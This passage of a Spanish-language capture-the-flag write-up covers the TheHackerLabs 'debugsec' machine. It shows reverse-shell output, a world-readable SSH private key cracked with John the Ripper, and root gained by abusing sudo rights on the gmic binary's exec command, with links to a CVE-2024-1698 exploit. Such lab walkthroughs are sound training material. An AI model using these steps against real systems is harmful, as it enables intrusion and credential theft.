+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.10.210<span style="color:#f92672">]</span> <span style="color:#ae81ff">54246</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>520<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>&lt;html/wp-content/themes/twentytwentythree/patterns$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><p>Ya solo obtén una sesión interactiva:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Paso 1:</span>
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 2:</span>
+</span></span><span style="display:flex;"><span>CTRL + Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 3:</span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 4: </span>
+</span></span><span style="display:flex;"><span>reset -&gt; xterm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 5:</span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm <span style="color:#f92672">&amp;&amp;</span> export SHELL<span style="color:#f92672">=</span>bash <span style="color:#f92672">&amp;&amp;</span> stty rows <span style="color:#ae81ff">51</span> columns <span style="color:#ae81ff">189</span>
+</span></span></code></pre></div><p>Listo.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="linEnum">Enumeración de la Máquina Víctima y Crackeo de Llave Privada id_rsa</h3>
+<p>Veamos qué usuarios existen:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@debugsec:/var/www/html$ cat /etc/passwd | grep <span style="color:#e6db74">&#39;bash&#39;</span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>debugsec:x:1001:1001::/home/debugsec:/bin/bash
+</span></span></code></pre></div><p>Solo existe el <strong>usuario debugsec</strong>.</p>
+<p>Podemos ver su directorio y su contenido, pero no podremos ver la flag aún:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@debugsec:/var/www/html$ ls -la /home
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root     root     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root     root     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> debugsec debugsec <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2024</span> debugsec
+</span></span><span style="display:flex;"><span>www-data@debugsec:/var/www/html$ ls -la /home/debugsec/ 
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> debugsec debugsec <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root     root     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">9</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2024</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> debugsec debugsec  <span style="color:#ae81ff">220</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> debugsec debugsec <span style="color:#ae81ff">3526</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> debugsec debugsec <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2024</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> debugsec debugsec  <span style="color:#ae81ff">807</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2023</span> .profile
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> debugsec debugsec <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2024</span> .ssh
+</span></span><span style="display:flex;"><span>-r-------- <span style="color:#ae81ff">1</span> debugsec debugsec   <span style="color:#ae81ff">36</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2024</span> user.txt
+</span></span></code></pre></div><p>Buscando un poco, encontramos algo interesante en el directorio <code>/opt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@debugsec:/var/www/html$ ls -la /opt
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root     root     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root     root     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> debugsec debugsec <span style="color:#ae81ff">3434</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2024</span> id_rsa
+</span></span></code></pre></div><p>Resulta ser la llave privada del <strong>usuario debugsec</strong> y la podemos leer.</p>
+<p>Cópiala en tu máquina, dale los permisos correctos y obtén su hash con la herramienta <strong>ssh2john</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano id_rsa
+</span></span><span style="display:flex;"><span>-----------
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>-----------
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span><span style="display:flex;"><span>ssh2john id_rsa &gt; hash
+</span></span></code></pre></div><p>Con <strong>JohnTheRipper</strong> la intentamos crackear:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>KDF/cipher <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>MD5/AES 1<span style="color:#f92672">=</span>MD5/3DES 2<span style="color:#f92672">=</span>Bcrypt/AES<span style="color:#f92672">])</span> is <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">16</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>pangga           <span style="color:#f92672">(</span>id_rsa<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:01:22 DONE <span style="color:#f92672">(</span>2025-07-22 12:59<span style="color:#f92672">)</span> 0.01205g/s 36.46p/s 36.46c/s 36.46C/s lance..love06
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Tenemos la frase usada en la <strong>llave privada id_rsa</strong>.</p>
+<p>Vamos a autenticarnos como el <strong>usuario debugsec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa debugsec@192.168.10.210
+</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>: 
+</span></span><span style="display:flex;"><span>Linux debugsec 6.1.0-21-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Tue Jul <span style="color:#ae81ff">22</span> 20:59:52 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>debugsec@debugsec:~$ whoami
+</span></span><span style="display:flex;"><span>debugsec
+</span></span></code></pre></div><p>Funcionó.</p>
+<p>Ahora sí podemos leer la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>debugsec@debugsec:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>debugsec@debugsec:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h3 id="gmic">Escalando Privilegios Abusando de los Privilegios Sudoers sobre Binario gmic</h3>
+<p>Veamos qué privilegios tiene nuestro usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>debugsec@debugsec:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> debugsec on debugsec:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin, use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User debugsec may run the following commands on debugsec:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/gmic
+</span></span></code></pre></div><p>Muy bien, podemos usar el <strong>binario gmic</strong> como <strong>Root</strong>.</p>
+<p>El problema es que no conozco este binario, así que vamos a investigar de qué se trata:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>GREYC&rsquo;s Magic for Image Computing</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>gmic (o G&rsquo;MIC) es un framework de procesamiento de imágenes muy poderoso, que se puede usar desde línea de comandos, con su propia sintaxis de scripting, o mediante interfaces gráficas como GIMP o Krita.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Investigando la forma de uso de este binario, resulta que podemos ejecutar algunos comandos que son para control de flujo:</p>
+<ul>
+<li><a href="https://gmic.eu/tutorial/command_guide.html#controlf" target="_blank">G&rsquo;MIC - Flow Control</a></li>
+</ul>
+<p>Y tenemos un comando que puede estar compilado en el binario, siendo el comando <strong>exec</strong>:</p>
+<ul>
+<li><a href="https://gmic.eu/reference/exec.html#top" target="_blank">G&rsquo;MIC - Flow Control: exec</a></li>
+</ul>
+<p>Parece que solo tenemos que indicarle el comando que queremos ejecutar.</p>
+<p>Vamos a probarlo con el comando <strong>id</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>debugsec@debugsec:~$ sudo /usr/bin/gmic exec <span style="color:#e6db74">&#34;id&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>gmic<span style="color:#f92672">]</span>-0./ Start G<span style="color:#e6db74">&#39;MIC interpreter.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[gmic]-0./ Execute external command &#39;</span>id<span style="color:#e6db74">&#39; in verbose mode.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">uid=0(root) gid=0(root) grupos=0(root)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[gmic]-0./ End G&#39;</span>MIC interpreter.
+</span></span></code></pre></div><p>Excelente, funciona.</p>
+<p>Entonces, le podemos pedir una sesión de bash y nos tendría que dar una sesión del <strong>Root</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>debugsec@debugsec:~$ sudo /usr/bin/gmic exec <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>gmic<span style="color:#f92672">]</span>-0./ Start G<span style="color:#e6db74">&#39;MIC interpreter.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[gmic]-0./ Execute external command &#39;</span>/bin/bash<span style="color:#960050;background-color:#1e0010">&#39;</span> in verbose mode.
+</span></span><span style="display:flex;"><span>root@debugsec:/home/debugsec# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Ya somos <strong>Root</strong>.</p>
+<p>Obtengamos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@debugsec:/home/debugsec# cd /root
+</span></span><span style="display:flex;"><span>root@debugsec:~# ls
+</span></span><span style="display:flex;"><span>gmic  root.txt
+</span></span><span style="display:flex;"><span>root@debugsec:~# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://www.vicarius.io/vsociety/posts/exploiting-the-unexploited-unauthenticated-blind-sqli-in-notificationx-wordpress-plugin-cve-2024-1698-a-novel-exploit-for-novel-folks" target="_blank" rel="noopener noreferrer">https://www.vicarius.io/vsociety/posts/exploiting-the-unexploited-unauthenticated-blind-sqli-in-notificationx-wordpress-plugin-cve-2024-1698-a-novel-exploit-for-novel-folks</a></li><li><a href="https://github.com/kamranhasan/CVE-2024-1698-Exploit" target="_blank" rel="noopener noreferrer">https://github.com/kamranhasan/CVE-2024-1698-Exploit</a></li><li><a href="https://gmic.eu/tutorial/command_guide.html#controlf" target="_blank" rel="noopener noreferrer">https://gmic.eu/tutorial/command_guide.html#controlf</a></li><li><a href="https://gmic.eu/reference/exec.html#top" target="_blank" rel="noopener noreferrer">https://gmic.eu/reference/exec.html#top</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-campanaFeliz/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Campana Feliz - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-bocataCalamares/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Bocata de Calamares - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
